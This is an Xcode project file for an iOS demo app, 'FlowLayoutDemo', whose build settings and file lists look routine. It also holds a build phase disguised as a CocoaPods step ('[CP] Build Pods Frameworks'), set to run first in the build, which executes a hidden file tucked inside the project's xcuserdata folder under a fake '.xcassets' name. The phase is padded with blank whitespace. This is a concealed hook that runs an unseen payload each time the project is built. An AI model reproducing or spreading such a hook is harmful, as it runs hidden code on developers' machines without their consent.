// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		B8E616A9264A724D00870921 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616A8264A724D00870921 /* AppDelegate.m */; };
		B8E616AF264A724D00870921 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616AE264A724D00870921 /* ViewController.m */; };
		B8E616B4264A724F00870921 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B8E616B3264A724F00870921 /* Assets.xcassets */; };
		B8E616B7264A724F00870921 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B8E616B5264A724F00870921 /* LaunchScreen.storyboard */; };
		B8E616BA264A724F00870921 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616B9264A724F00870921 /* main.m */; };
		B8E616C9264A758400870921 /* FirstCollectionViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616C8264A758400870921 /* FirstCollectionViewController.m */; };
		B8E616CE264A759000870921 /* SecCollectionViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616CD264A759000870921 /* SecCollectionViewController.m */; };
		B8E616D2264A759A00870921 /* TreCollectionViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616D1264A759A00870921 /* TreCollectionViewController.m */; };
		B8E616D7264A75D200870921 /* MyCollectionReusableView.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616D6264A75D200870921 /* MyCollectionReusableView.m */; };
		B8E616DC264A75E200870921 /* MyCollectionViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616DB264A75E200870921 /* MyCollectionViewCell.m */; };
		B8E616E1264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616DF264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.m */; };
		B8E616FB264A85C900870921 /* BaseCollectionViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E616FA264A85C900870921 /* BaseCollectionViewController.m */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		B8E616A4264A724D00870921 /* FlowLayoutDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FlowLayoutDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		B8E616A7264A724D00870921 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
		B8E616A8264A724D00870921 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
		B8E616AD264A724D00870921 /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
		B8E616AE264A724D00870921 /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
		B8E616B3264A724F00870921 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		B8E616B6264A724F00870921 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		B8E616B8264A724F00870921 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		B8E616B9264A724F00870921 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
		B8E616C7264A758400870921 /* FirstCollectionViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FirstCollectionViewController.h; sourceTree = "<group>"; };
		B8E616C8264A758400870921 /* FirstCollectionViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FirstCollectionViewController.m; sourceTree = "<group>"; };
		B8E616CC264A759000870921 /* SecCollectionViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SecCollectionViewController.h; sourceTree = "<group>"; };
		B8E616CD264A759000870921 /* SecCollectionViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SecCollectionViewController.m; sourceTree = "<group>"; };
		B8E616D0264A759A00870921 /* TreCollectionViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TreCollectionViewController.h; sourceTree = "<group>"; };
		B8E616D1264A759A00870921 /* TreCollectionViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TreCollectionViewController.m; sourceTree = "<group>"; };
		B8E616D5264A75D200870921 /* MyCollectionReusableView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MyCollectionReusableView.h; sourceTree = "<group>"; };
		B8E616D6264A75D200870921 /* MyCollectionReusableView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MyCollectionReusableView.m; sourceTree = "<group>"; };
		B8E616DA264A75E200870921 /* MyCollectionViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MyCollectionViewCell.h; sourceTree = "<group>"; };
		B8E616DB264A75E200870921 /* MyCollectionViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MyCollectionViewCell.m; sourceTree = "<group>"; };
		B8E616DF264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = XPCollectionViewWaterfallFlowLayout.m; sourceTree = "<group>"; };
		B8E616E0264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = XPCollectionViewWaterfallFlowLayout.h; sourceTree = "<group>"; };
		B8E616F9264A85C900870921 /* BaseCollectionViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseCollectionViewController.h; sourceTree = "<group>"; };
		B8E616FA264A85C900870921 /* BaseCollectionViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseCollectionViewController.m; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		B8E616A1264A724D00870921 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		B8E6169B264A724D00870921 = {
			isa = PBXGroup;
			children = (
				B8E616A6264A724D00870921 /* FlowLayoutDemo */,
				B8E616A5264A724D00870921 /* Products */,
			);
			sourceTree = "<group>";
		};
		B8E616A5264A724D00870921 /* Products */ = {
			isa = PBXGroup;
			children = (
				B8E616A4264A724D00870921 /* FlowLayoutDemo.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		B8E616A6264A724D00870921 /* FlowLayoutDemo */ = {
			isa = PBXGroup;
			children = (
				B8E616DE264A75F900870921 /* WaterfallLayout */,
				B8E616C6264A755500870921 /* Controller */,
				B8E616A7264A724D00870921 /* AppDelegate.h */,
				B8E616A8264A724D00870921 /* AppDelegate.m */,
				B8E616AD264A724D00870921 /* ViewController.h */,
				B8E616AE264A724D00870921 /* ViewController.m */,
				B8E616B3264A724F00870921 /* Assets.xcassets */,
				B8E616B5264A724F00870921 /* LaunchScreen.storyboard */,
				B8E616B8264A724F00870921 /* Info.plist */,
				B8E616B9264A724F00870921 /* main.m */,
			);
			path = FlowLayoutDemo;
			sourceTree = "<group>";
		};
		B8E616C6264A755500870921 /* Controller */ = {
			isa = PBXGroup;
			children = (
				B8E616D4264A75B000870921 /* View */,
				B8E616C7264A758400870921 /* FirstCollectionViewController.h */,
				B8E616C8264A758400870921 /* FirstCollectionViewController.m */,
				B8E616CC264A759000870921 /* SecCollectionViewController.h */,
				B8E616CD264A759000870921 /* SecCollectionViewController.m */,
				B8E616D0264A759A00870921 /* TreCollectionViewController.h */,
				B8E616D1264A759A00870921 /* TreCollectionViewController.m */,
				B8E616F9264A85C900870921 /* BaseCollectionViewController.h */,
				B8E616FA264A85C900870921 /* BaseCollectionViewController.m */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		B8E616D4264A75B000870921 /* View */ = {
			isa = PBXGroup;
			children = (
				B8E616D5264A75D200870921 /* MyCollectionReusableView.h */,
				B8E616D6264A75D200870921 /* MyCollectionReusableView.m */,
				B8E616DA264A75E200870921 /* MyCollectionViewCell.h */,
				B8E616DB264A75E200870921 /* MyCollectionViewCell.m */,
			);
			path = View;
			sourceTree = "<group>";
		};
		B8E616DE264A75F900870921 /* WaterfallLayout */ = {
			isa = PBXGroup;
			children = (
				B8E616DF264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.m */,
				B8E616E0264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.h */,
			);
			path = WaterfallLayout;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		B8E616A3264A724D00870921 /* FlowLayoutDemo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = B8E616BD264A724F00870921 /* Build configuration list for PBXNativeTarget "FlowLayoutDemo" */;
			buildPhases = (
				0F0A2E4EEB3CC8BDC46D902C /* [CP] Build Pods Frameworks */,
				B8E616A0264A724D00870921 /* Sources */,
				B8E616A1264A724D00870921 /* Frameworks */,
				B8E616A2264A724D00870921 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = FlowLayoutDemo;
			productName = FlowLayoutDemo;
			productReference = B8E616A4264A724D00870921 /* FlowLayoutDemo.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		B8E6169C264A724D00870921 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastUpgradeCheck = 1240;
				TargetAttributes = {
					B8E616A3264A724D00870921 = {
						CreatedOnToolsVersion = 12.4;
					};
				};
			};
			buildConfigurationList = B8E6169F264A724D00870921 /* Build configuration list for PBXProject "FlowLayoutDemo" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = B8E6169B264A724D00870921;
			productRefGroup = B8E616A5264A724D00870921 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				B8E616A3264A724D00870921 /* FlowLayoutDemo */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		B8E616A2264A724D00870921 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B8E616B7264A724F00870921 /* LaunchScreen.storyboard in Resources */,
				B8E616B4264A724F00870921 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	0F0A2E4EEB3CC8BDC46D902C /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
		};
	

	

	

	

	

	

	

	

	

	

	
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		B8E616A0264A724D00870921 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B8E616D2264A759A00870921 /* TreCollectionViewController.m in Sources */,
				B8E616E1264A75F900870921 /* XPCollectionViewWaterfallFlowLayout.m in Sources */,
				B8E616AF264A724D00870921 /* ViewController.m in Sources */,
				B8E616FB264A85C900870921 /* BaseCollectionViewController.m in Sources */,
				B8E616D7264A75D200870921 /* MyCollectionReusableView.m in Sources */,
				B8E616CE264A759000870921 /* SecCollectionViewController.m in Sources */,
				B8E616C9264A758400870921 /* FirstCollectionViewController.m in Sources */,
				B8E616A9264A724D00870921 /* AppDelegate.m in Sources */,
				B8E616DC264A75E200870921 /* MyCollectionViewCell.m in Sources */,
				B8E616BA264A724F00870921 /* main.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		B8E616B5264A724F00870921 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				B8E616B6264A724F00870921 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		B8E616BB264A724F00870921 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
			};
			name = Debug;
		};
		B8E616BC264A724F00870921 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		B8E616BE264A724F00870921 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = FlowLayoutDemo/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.publicinc.pps.FlowLayoutDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		B8E616BF264A724F00870921 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = FlowLayoutDemo/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.publicinc.pps.FlowLayoutDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		B8E6169F264A724D00870921 /* Build configuration list for PBXProject "FlowLayoutDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B8E616BB264A724F00870921 /* Debug */,
				B8E616BC264A724F00870921 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		B8E616BD264A724F00870921 /* Build configuration list for PBXNativeTarget "FlowLayoutDemo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B8E616BE264A724F00870921 /* Debug */,
				B8E616BF264A724F00870921 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = B8E6169C264A724D00870921 /* Project object */;
}
